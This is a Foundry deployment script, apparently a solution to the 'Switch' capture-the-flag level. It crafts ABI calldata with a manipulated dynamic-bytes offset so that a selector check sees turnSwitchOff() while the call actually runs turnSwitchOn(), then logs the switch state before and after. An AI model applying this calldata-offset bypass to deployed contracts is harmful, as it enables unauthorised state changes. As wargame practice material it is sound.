// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {Switch} from "../../src/29/Switch.sol";


contract SwitchScript is Script{
    function run() public{

        bytes32 sig1 = keccak256("turnSwitchOff()");
        bytes4 sig2 = bytes4(keccak256("turnSwitchOn()"));
        bytes4 sig3 = bytes4(keccak256("flipSwitch(bytes)"));

        bytes memory data = abi.encodeWithSelector(sig3, 96, 0, sig1, 4, sig2);

        // console.logBytes(data);

        vm.startBroadcast();

        Switch switchC = new Switch();
        console.log(switchC.switchOn());
        address(switchC).call(data);
        console.log(switchC.switchOn());
        vm.stopBroadcast();

    }
}